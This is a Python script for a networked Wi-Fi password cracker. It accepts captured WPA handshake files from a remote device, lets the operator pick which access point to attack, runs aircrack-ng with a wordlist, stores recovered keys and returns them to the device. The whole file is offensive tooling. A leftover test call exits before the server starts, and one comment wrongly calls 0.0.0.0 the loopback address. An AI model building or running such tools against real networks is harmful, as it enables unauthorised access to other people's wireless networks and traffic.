import socket
import os
import subprocess

# TODO: possibly combine retied captures to add missing keys from other incomplete sets
# TODO: add a persistent file to store the AP names + MAC and the cracked key for every file sent over
global fileName
fileName = ""


def bToString(arg):
    return ''.join(map(chr, arg))


def getNetworksInFile(data):
    capturedNetworks = data
    for i in range(0, len(capturedNetworks)):
        if capturedNetworks[i].strip().__contains__("BSSID"):
            start = i
        elif capturedNetworks[i].strip().__contains__("Choosing") or capturedNetworks[i].strip().__contains__("Index"):
            end = i
            break
    capturedNetworks = capturedNetworks[start + 1:end]
    networks = []
    for each in capturedNetworks:
        if each != '':
            network = each.strip().split("  ")
            networks.append([network[1], network[2]])

    return networks


def breakKey():
    # to extract the key we use the aircrack tool with a word list
    # TODO: Add option to brute force rather than word list, or possibly chose the word list (USE crunch)

    # check if we have already grabbed the key
    key = ""
    file = open("keys.txt", "r")
    lines = file.readlines()
    file.close()
    for line in lines:
        if line.__contains__(fileName[0:-4]):
            key = line.split(",")[1]
            break
    if key:
        print("Key already found")
        print(key)
        return key
    else:
        print("Extracting key")
        cracking = subprocess.run(
            ['.\\aircrack-ng-1.6-win\\bin\\aircrack-ng.exe', "-l", "password", "-w", "wordlist.txt", fileName],
            shell=True, stdout=subprocess.PIPE)
        cracking.stdout = bToString(cracking.stdout)
        networks = getNetworksInFile(cracking.stdout.split("\n"))
        print(networks)
        if cracking.stdout.__contains__("KEY FOUND"):
            keyFile = open("password")
            key = keyFile.readline()
            keyFile.close()
            print("Key found:", key)
            file = open("keys.txt", "a")
            file.write(fileName[0:-4])
            file.write(",")
            file.write(key)
            file.write("\n")
            file.close()
            # delete .cap file
            # subprocess.run(["del", fileName], shell=True)
            # send key back
            return key
        else:
            return None


fileName = "BSkyB_684682.cap"
breakKey()
exit()

HOST = "0.0.0.0"  # Standard loopback interface address (localhost)
PORT = 1234  # Port to listen on (non-privileged ports are > 1023)
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"

s = socket.socket()
s.bind((HOST, PORT))
s.listen(5)
print(f"[*] Listening as {HOST}:{PORT}")
while True:
    client_socket, client_address = s.accept()
    print(f"[+] {client_address} is connected.")
    # use this header to dictate which following action is used
    receivedHeader = client_socket.recv(BUFFER_SIZE).decode()
    headerCode, headerMessage = receivedHeader.split(SEPARATOR)
    if int(headerCode) == 1:
        # Read discovered Access points to allow user to select which one to attack
        headerMessage = headerMessage.split(",")
        i = 0
        j = 0
        while i < len(headerMessage):
            print(f"[{j}] :: {headerMessage[i]} : {headerMessage[i + 1]}")
            i += 2
            j += 1
        index = input("select the numeric value for the AP you wish to attack, -1 to rescan: ")
        client_socket.send(bytes(index, 'utf-8'))
        client_socket.close()
    elif int(headerCode) == 2:
        # prepare to read the file contain the handshake
        print("Receiving Handshake file")
        received = client_socket.recv(BUFFER_SIZE)
        received = bToString(received)
        fileName, filesize = received.split(SEPARATOR)
        filesize = int(filesize)
        print(f"Receiving file {fileName} of size {filesize}")
        client_socket.sendall(bytes(f"Ready {fileName}", 'utf-8'))
        fileName = os.path.basename(fileName)
        writeFile = open(fileName, "wb")
        # counter for the bytes read so we can end once the whole file is received
        count = 0
        while count < filesize:
            # read 1024 bytes from the socket
            bytes_read = client_socket.recv(BUFFER_SIZE)
            # write new data to file
            writeFile.write(bytes_read)
            # update the counter
            count += (len(bytes_read))
        print("File received")
        # hand off the file to break the key
        key = breakKey()
        if key is None:
            print("No key extracted")
        else:
            # if we get a key, send it back to the device
            client_socket.sendall(bytes(key, 'utf-8'))
            client_socket.close()
            print("Key sent to device")
            exit()
